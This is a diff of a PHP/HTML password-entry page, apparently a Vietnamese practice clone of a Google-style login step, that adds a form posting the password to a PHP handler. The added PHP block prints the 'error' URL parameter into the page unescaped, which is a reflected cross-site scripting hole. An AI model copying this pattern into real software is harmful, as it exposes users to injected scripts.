@@ -2,14 +2,14 @@
 <html>
 
 <head>
-  <title>SignUpPassWord</title>
+  <title>LoginPassWord</title>
   <meta charset="utf-8">
   <link rel="stylesheet" href="css/LoginPassWord.css">
   <!-- CSS only -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
   <!-- JavaScript Bundle with Popper -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
+
 </head>
 
 <body>
@@ -19,8 +19,16 @@
     <p>Hãy nhập mật khẩu của bạn</p>
 
       <div>
-    <input class="input1" type="password" placeholder="Nhập mật khẩu của bạn" required><br>
-    
+      <form class="form-signin" action="process-LoginPW.php" method="post">
+    <input class="input1" type="password" name="txtPass" placeholder="Nhập mật khẩu của bạn" required><br>
+
+    <?php
+                    if(isset($_GET['error'])){
+                        echo "<p style='color:red;font-size:13px;margin:5px 33px;text-align:left;'><svg aria-hidden='true' fill='currentColor' focusable='false' width='16px' height='16px' viewBox='0 0 24 24' xmlns='https://www.w3.org/2000/svg'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'></path></svg> {$_GET['error']} </p>";
+                    }
+
+                ?>
+
     <div class="col-md-6" style="margin-bottom:15%;">
     <input type="checkbox" class="show-btn"> Hiển thị mật khẩu
 </div>
@@ -29,12 +37,13 @@
 
     <div class="row" style="margin-bottom: 30%;">
         <div class="col-md-5">
-          <a style="text-decoration: none" href="https://accounts.google.com/signin/v2/challenge/pwd?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=2&TL=AM3QAYb0gbF4HwNPHM_Y6NA7f2yVIGqWscKDne9imQrM57QgDKq7_ySkWrZSbIlh&navigationDirection=forward">Quên mật khẩu?</a>
+          <a style="text-decoration: none" href="#">Quên mật khẩu?</a>
         </div>
         <div class="d-grid  col-4 mx-auto">
-          <button type="button" class="btn btn-primary">Tiếp theo</button>
+        <button type="submit" class="btn btn-primary" name="btnSignIn2">Tiếp theo</button>
         </div>
       </div>
+      </form>
   </div>
   <div style="margin-left: 36.5%; font-size: 15px; width: 26%;">
 
